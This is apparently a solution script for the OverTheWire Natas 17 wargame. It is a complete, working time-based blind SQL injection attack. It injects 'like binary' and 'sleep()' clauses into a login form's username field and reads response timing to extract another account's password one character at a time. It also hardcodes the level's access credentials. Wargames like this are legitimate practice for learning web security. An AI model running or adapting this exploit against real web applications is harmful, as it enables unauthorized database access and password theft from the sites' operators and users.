import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas17.natas.labs.overthewire.org/index.php?debug=true'
# wait 0.1 seconds if password begins with string (case sensitive)
prefix = 'natas18" and password like binary\''
# theres probably a more elegant way to finish the query, but it works
suffix = '%\' and sleep(0.1) and username = "natas18'
response = ''
# base auth
auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
# all letters and numbers, as strings
chars = list(string.ascii_lowercase) + list(string.ascii_uppercase) + [str(i) for i in range(0,10)]
filtered = list()

password = ''

# find out which chars are in the password at all
for c in chars:
    request = {'username': prefix +  '%' + c + suffix }
    x = requests.post(url, data = request, auth = auth)
    time = x.elapsed.total_seconds()
    print(time)
    if (time > 0.15):
        filtered.append(c)

print filtered

# iteratively build password
anotherMatch = True
while anotherMatch:
    anotherMatch = False
    for c in filtered:
        request = {'username': prefix + password + c + suffix }
        x = requests.post(url, data = request, auth = auth)
        time = x.elapsed.total_seconds()
        if(time > 0.15):
            anotherMatch = True
            password = password + c
            print(password)
